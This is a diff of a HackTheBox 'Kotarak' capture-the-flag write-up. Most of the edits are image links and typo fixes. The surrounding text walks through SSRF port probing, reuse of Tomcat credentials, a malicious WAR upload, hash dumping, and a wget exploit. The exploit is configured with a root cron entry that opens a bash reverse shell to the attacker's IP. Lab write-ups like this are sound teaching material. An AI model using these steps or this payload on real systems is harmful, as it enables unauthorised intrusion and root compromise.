@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 58.93 seconds
 
 The Kotarak Web Hosting on port 60000 seems linteresting, lets check that out first:
 
-site.png
+![site.png](../assets/kotarak_assets/site.png)
 
 Trying to enter www.hackthebox.com in the search box fowrards us to: http://10.10.10.55:60000/url.php?path=www.hackthebox.com%2F
 
@@ -55,23 +55,23 @@ But if we search for 10.10.10.55:22 we get the message `SSH-2.0-OpenSSH_7.2p2 Ub
 
 We can do this by fuzzing the site with a list of ports that may be open on localhost. I'll use wfuzz for this:
 
-fuzz.png
+![fuzz.png](../assets/kotarak_assets/fuzz.png)
 
 Nice, looks like we have a few more ports to investigate now. After poking around a bit I found some interesting materials at http://10.10.10.55:60000/url.php?path=127.0.0.1%3A888
 
-888.png
+![888.png](../assets/kotarak_assets/888.png)
 
-Now if we input http://127.0.0.1:888/?doc=backup into the search on port 60000 and inspect the page sorce we find credentials for the Tomcat service running on port 8080:
+Now if we input http://127.0.0.1:888/?doc=backup into the search on port 60000 and inspect the page source we find credentials for the Tomcat service running on port 8080:
 
-creds.png
+![creds.png](../assets/kotarak_assets/creds.png)
 
 Based on past experience with Tomcat I know the login can be found at 10.10.10.55:8080/manager/html
 
-login.png
+![login.png](../assets/kotarak_assets/login.png)
 
 These credentials work and we can now authenticate to the site:
 
-tomcat.png
+![tomcat.png](../assets/kotarak_assets/tomcat.png)
 
 ### Exploitation
 
@@ -86,7 +86,7 @@ Final size of war file: 1097 bytes
 
 We can upload the file and verify it loaded correctly:
 
-file.png
+![file.png](../assets/kotarak_assets/file.png)
 
 Then with a NetCat listener listening, we can simply click on our shell file and catch the reverse shell back in NetCat:
 
@@ -131,15 +131,15 @@ Lets copy these back to our attacking machine.
 
 First we'll set up a Python server on the target and then use wget on our attacking machine to retrieve the files:
 
-wget.png
+![wget.png](../assets/kotarak_assets/wget.png)
 
 Now lets use impacket-secretsdump to extract some hashes
 
-dump.png
+![dump.png](../assets/kotarak_assets/dump.png)
 
 Nice, we've found a few. Lets grab the Administrator and the atanas hash and crack them in CrackStation:
 
-crack.png
+![crack.png](../assets/kotarak_assets/crack.png)
 
 Cool, that worked. Lets try to `su atanas` on the target:
 
@@ -156,7 +156,7 @@ Interestingly, the atanas password didn't work here, but the admin password did.
 
 We can now grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/kotarak_assets/user_flag.png)
 
 ### Privilege Escalation
 
@@ -175,8 +175,7 @@ Getting closer! But what you are looking for can't be found here.
 
 Interesting, it appears IP address 10.0.3.33 is using wget to try and access a file every 2 minutes. This must be running as a cronjob.  
 
-Looking at exploits for this version we find: https://www.exploit-db.com/exploits/40064
-
+Looking at exploits for this version of wget we find: https://www.exploit-db.com/exploits/40064
 
 First we'll need to upadte the wget-exploit.py portion of the script to:
 
@@ -189,7 +188,7 @@ FTP_PORT = 21
 ROOT_CRON = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.48/8888 0>&1' \n"
 ```
 
-Next we'll want to get another working shell on the target ( I just ran the .war file again with another listener set up).
+Next we'll want to get another working shell on the target (I just ran the .war file again with another listener set up).
 
 Now lets start an ftpserver on the target:
 
@@ -216,7 +215,7 @@ atanas@kotarak-dmz:/tmp/...$ authbind python wget-exploit.py
 
 With a listener set up on port 8888, we will eventually catch a shell back as the root user, and we can grab the final flag:
 
-root_flag.png
+![root_flag.png](../assets/kotarak_assets/root_flag.png)
 
 Thanks for following along!
 
